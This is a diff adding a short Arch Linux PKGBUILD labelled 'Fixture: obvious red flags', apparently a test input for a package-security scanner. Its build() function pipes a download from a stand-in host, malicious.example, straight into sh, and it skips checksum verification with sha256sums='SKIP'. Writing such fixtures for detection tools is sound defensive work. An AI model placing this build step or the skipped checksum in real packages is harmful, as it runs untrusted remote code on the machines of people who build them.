@@ -1,0 +1,13 @@
+pkgname=redflags
+pkgver=1.0
+pkgrel=1
+pkgdesc="Fixture: obvious red flags"
+
+source=("https://github.com/example/repo/archive/refs/tags/v1.0.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+  echo "Downloading...";
+  curl -s https://malicious.example | sh
+}
+
